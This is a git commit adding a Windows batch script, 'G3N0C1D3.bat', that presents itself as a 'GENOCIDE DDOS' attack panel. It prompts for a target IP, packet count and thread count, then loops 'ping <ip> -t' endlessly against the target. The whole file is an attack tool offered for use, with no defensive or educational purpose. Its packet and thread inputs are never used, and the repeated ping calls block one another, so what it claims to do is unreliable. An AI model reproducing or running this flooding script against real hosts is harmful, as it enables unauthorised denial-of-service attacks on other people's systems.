3fda005dc6786ede9852ccfd01934cbb09962728
MNSTRXZ/VYHURTIN <97280490+MNSTRXZexe@users.noreply.github.com>
2022-01-15 07:06:47 +0700

    Add files via upload

---
+++ G3N0C1D3.bat
@@ -0,0 +1,43 @@
+ÿþ
+BY MNSTRXZexe
+# DONT  RECODE DUDE PLZ
+
+echo off
+mode con cols=65 lines=32
+setlocal enabledelayedexpansion
+color a
+:panel
+title .:PANEL:.
+set /p name=Enter Your Name ? :
+echo Thanks For Using GENOCIDE DDOS %name% 
+pause>nul
+echo Follow Me On Github MNSTRXZexe
+echo Press Enter                     
+
+:top
+color c
+title ATTACK Panel
+pause>nul
+cls
+echo %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+                          
+echo  G3N0C1D3 MNSTRX
+
+echo %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+set /p ip=Enter Ip Target :
+set /p Packet=Packet To Sends :
+set /p Thread=Thread To Sends :
+echo Sending Attack.....
+:atck
+color a
+title .:ATTACKING %ip%:.
+echo [.]ATTACK SENDING[.] %ip% Ping %ip%
+@ping %ip% -t
+@ping %ip% -t
+@ping %ip% -t
+@ping %ip% -t
+@ping %ip% -t
+goto atck
+                                                               
+
+
